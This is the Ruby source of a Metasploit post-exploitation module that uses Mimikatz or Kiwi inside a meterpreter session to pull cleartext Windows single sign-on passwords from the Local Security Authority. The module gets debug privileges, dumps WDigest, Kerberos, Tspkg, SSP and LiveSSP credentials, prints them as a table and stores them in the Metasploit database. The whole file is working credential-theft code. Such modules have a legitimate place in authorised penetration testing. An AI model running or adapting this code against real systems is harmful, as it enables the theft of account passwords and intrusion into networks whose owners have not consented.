##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/mimikatz'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Mimikatz
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info(info,
      'Name'         => 'Windows Single Sign On Credential Collector (Mimikatz)',
      'Description'  => %q{
        This module will collect cleartext Single Sign On credentials from the Local
      Security Authority using the Mimikatz extension. Blank passwords will not be stored
      in the database.
          },
      'License'      => MSF_LICENSE,
      'Author'       => ['Ben Campbell'],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter' ]
    ))
  end

  def get_privs
    if is_system?
      true
    else
      vprint_warning("Not running as SYSTEM")
      privs = session.sys.config.getprivs
      if privs =~ /SeDebugPrivilege/i
        vprint_status("Got SeDebugPrivilege")
        true
      else
        false
      end
    end
  end

  def run
    unless sysinfo
      print_error("This module is only available in a windows meterpreter session.")
      return
    end

    print_status("Running module against #{sysinfo['Computer']}")

    get_privs
    table = Rex::Ui::Text::Table.new(
      'Header' => "Windows SSO Credentials",
      'Indent' => 0,
      'SortIndex' => 0,
      'Columns' =>
      [
        'AuthID', 'Domain', 'User', 'Password'
      ]
    )

    if load_kiwi
      res = session.kiwi.all_pass
      unique_results = res.index_by { |r| "#{r[:auth_high]};#{r[:auth_lo]}#{r[:username]}#{r[:password]}" }.values
      unique_results.each do |result|
        next if is_system_user? result[:username]
        table << ["#{result[:auth_high]};#{result[:auth_lo]}", result[:domain], result[:username], result[:password]]
        report_creds(result[:domain], result[:username], result[:password])
      end
    elsif load_mimikatz
      vprint_status("Retrieving WDigest")
      res = client.mimikatz.wdigest
      vprint_status("Retrieving Tspkg")
      res.concat client.mimikatz.tspkg
      vprint_status("Retrieving Kerberos")
      res.concat client.mimikatz.kerberos
      vprint_status("Retrieving SSP")
      res.concat client.mimikatz.ssp
      vprint_status("Retrieving LiveSSP")
      livessp = client.mimikatz.livessp
      unless livessp.first[:password] =~ /livessp KO/
        res.concat client.mimikatz.livessp
      else
        vprint_error("LiveSSP credentials not present")
      end
      unique_results = res.index_by { |r| "#{r[:authid]}#{r[:user]}#{r[:password]}" }.values

      unique_results.each do |result|
        next if is_system_user? result[:user]
        table << [result[:authid], result[:domain], result[:user], result[:password]]
        report_creds(result[:domain], result[:user], result[:password])
      end
    end

    print_line table.to_s
  end

  def report_creds(domain, user, pass)
    return if (user.blank? or pass.blank?)
    return if pass.include?("n.a.")

    if session.db_record
      source_id = session.db_record.id
    else
      source_id = nil
    end

    report_auth_info(
      :host  => session.session_host,
      :port => 445,
      :sname => 'smb',
      :proto => 'tcp',
      :source_id => source_id,
      :source_type => "exploit",
      :user => "#{domain}\\#{user}",
      :pass => pass
    )
  end

  def is_system_user?(user)
    system_users = [
      /^$/,
      /^DWM-\d$/,
      /^ASPNET$/,
      /^ASP\.NET V2\.0 Integrated$/,
      /^ANONYMOUS LOGON$/,
      /^IUSR.*/,
      /^IWAM.*/,
      /^IIS_WPG$/,
      /.*\$$/,
      /^LOCAL SERVICE$/,
      /^NETWORK SERVICE$/,
      /^LOCAL SYSTEM$/
    ]

    return system_users.find{|r| user.match(r)}
  end

end

